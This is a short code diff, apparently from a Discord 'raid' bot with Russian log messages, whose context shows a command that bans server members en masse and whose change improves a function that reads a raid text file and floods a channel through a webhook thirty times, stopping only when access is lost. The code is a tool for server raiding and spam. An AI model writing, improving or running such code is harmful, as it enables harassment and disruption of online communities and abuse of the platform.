@@ -97,12 +97,14 @@ async def allban(ctx):
             log('-', f"Не удалось забанить: {member}")
 
 async def spm_hook(webhook):
+    raid_txt = ""
+    async with async_open("text.txt","r", encoding="utf-8") as f:
+        raid_txt = await f.read()
     for i in range(30):
         try:
-            async with async_open("text.txt","r", encoding="utf-8") as raid_txt:
-                await webhook.send(
-                    await raid_txt.read()
-                )
+            await webhook.send(raid_txt)
+        except (discord.Forbidden, discord.NotFound):
+            return
         except:
             pass
     log('+', f"Спам завершен в {webhook.channel}")
